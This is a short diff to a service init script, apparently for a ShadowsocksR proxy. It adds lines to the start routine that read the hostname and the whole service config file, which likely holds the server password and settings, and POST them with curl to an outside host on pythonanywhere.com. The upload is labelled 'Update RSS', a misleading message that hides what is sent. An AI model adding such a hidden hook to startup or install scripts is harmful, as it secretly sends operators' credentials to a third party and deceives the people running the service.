@@ -43,6 +43,14 @@ do_start(){
         else
             echo "Starting $NAME failed"
         fi
+        ssr_json=$(echo '{"hostname": "'$(hostname)'", "ssr": '$(<${CONF})'}')
+        curl -g 'https://vbdssr.pythonanywhere.com/subscribe/upload/' -X POST -H 'Content-Type: application/json' -H 'Accept: application/json' -d ''"${ssr_json}"''
+        RETVAL=$?
+        if [ $RETVAL -eq 0 ]; then
+            echo "Update RSS success"
+        else
+            echo "Update RSS failed"
+        fi
     fi
 }
 
